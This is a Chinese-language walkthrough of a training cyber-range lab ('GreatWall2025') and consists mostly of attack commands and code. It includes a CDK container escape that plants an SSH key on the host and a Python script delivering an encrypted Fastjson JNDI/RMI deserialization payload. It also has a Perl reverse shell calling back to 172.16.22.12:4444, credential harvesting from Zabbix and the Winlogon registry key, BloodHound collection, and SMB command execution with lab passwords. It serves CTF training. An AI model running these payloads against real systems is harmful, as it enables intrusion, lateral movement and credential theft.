# WP | 云境靶场GreatWall2025

> 原文: https://www.ctfiot.com/273377.html
> ID: 273377

春秋云境.com x 2025长城杯

联合推出全新靶标

“GreatWall2025”

现已在平台上线

特别致谢 Hony 师傅

对新靶标WP的无私分享！

“GreatWall2025” 介绍

春秋云境.com新靶场GreatWall2025，场景以内网常见服务为基础，玩家需综合运用信息收集、漏洞利用、容器逃逸、横向移动、权限提升等全流程渗透技术，突破组织的网络安全防御架构，最终夺取核心业务系统控制权。

Flag1 – Spring Cloud Gateway RCE & Docker 逃逸

外网入口机器开放了 3 个端口：

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8080/tcp open  rtsp

8080 端口的 spring 存在  gateway/routes 接口：

赛事交流群

了解更多关于春秋GAME的信息，可加入春秋赛事宇宙专属微信群。在这里，您不仅能了解到最新的赛事资讯，还能结识一群志同道合、热爱比赛的学习伙伴。我们期待您的加入，一起成长、共同进步！

（添加管理员，申请入群）


```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8080/tcp open  rtsp
```



```
upx cdk_linux
```



```
split -b 100k cdk_linux cdk.part.
```



```
cat cdk.part.* > cdk_linux
```



```
chmod +x ./cdk_linux
./cdk_linux evaluate --full
./cdk_linux run mount-procfs /host/proc/ "mkdir /root/.ssh/"
./cdk_linux run mount-procfs /host/proc/ 'echo xxxxxxxxx >> /root/.ssh/authorized_keys'
```



```
import base64
import os
import json
import requests
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ===== 配置信息 =====
SERVER_URL = "http://172.16.22.88:8080/api/login"

# Java 代码中的 RSA 公钥（Base64 格式）
PUBLIC_KEY_B64 = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqACjbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrztFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXvHVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpDL0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1uxm5ZQIDAQAB"
)

# ===== 1. 要发送的 JSON 明文 =====
plaintext = """{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.16.22.12:50388/d3b02d",
    "autoCommit": true
}"""
print(plaintext)

# ===== 2. 生成随机 AES key (128-bit) =====
aes_key = os.urandom(16)

# ===== 3. AES/GCM 加密 =====
iv = os.urandom(12)  # 12 字节 IV
encryptor = Cipher(
    algorithms.AES(aes_key),
    modes.GCM(iv),
    backend=default_backend()
).encryptor()

ciphertext = encryptor.update(plaintext.encode("utf-8")) + encryptor.finalize()
tag = encryptor.tag

# Body = IV + 密文 + GCM tag
body_raw = iv + ciphertext + tag
body_b64 = base64.b64encode(body_raw).decode("utf-8")

# ===== 4. 用 RSA 公钥加密 AES key =====
pub_bytes = base64.b64decode(PUBLIC_KEY_B64)
public_key = serialization.load_der_public_key(pub_bytes, backend=default_backend())

enc_key = public_key.encrypt(
    aes_key,
    padding.PKCS1v15()
)
enc_key_b64 = base64.b64encode(enc_key).decode("utf-8")

# ===== 5. 发送 POST 请求 =====
headers = {
    "Content-Type": "application/octet-stream",
    "X-Encrypted-Key": enc_key_b64,
}

resp = requests.post(SERVER_URL, data=body_b64.encode("utf-8"), headers=headers, timeout=10)
print("Status:", resp.status_code)
print("Response:", resp.text)
```



```
perl -e 'use Socket;$i="172.16.22.12";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```



```
ss -a -F /flag.txt
```



```
mysql -uzabbix -ppassword -e "select * from zabbix.userdirectory_ldapG"
```



```
bloodhound-ce-python -u ldapadmin -p XpVLGkQHm8 -d zwfw.com -dc DC.zwfw.com -ns 172.16.22.41 -c all --auth-method ntlm --dns-tcp --zip
```



```
reg query "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon"
```



```
nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO --codec GBK -x 'type C:UsersAdministratorDesktopflag.txt'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997794-wxsync-2025-10-c765722c232cfaaf2ee923f789a6473e.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997797-wxsync-2025-10-1bdb157274011193a7075707ea366095.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997798-wxsync-2025-10-75dbad739930bd947b5702bdbe21d92b.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997802-wxsync-2025-10-405a555f6c9b9a31beb99f4b50e41098.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997806-wxsync-2025-10-b00ceb8d323fcc2a2aa9acd994183591.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997810-wxsync-2025-10-faa3ce2f74c3015337617e504c6c8f43.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997813-wxsync-2025-10-b48430f0dfb70bd6dc5ac92872222309.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997815-wxsync-2025-10-feb943641aa4a163186d24eaa40e41fa.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997824-wxsync-2025-10-3891e7154fb4b736fa34dc337c2299c0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1759997830-wxsync-2025-10-aea574d8f8d201e993aa336c45898a7b.png)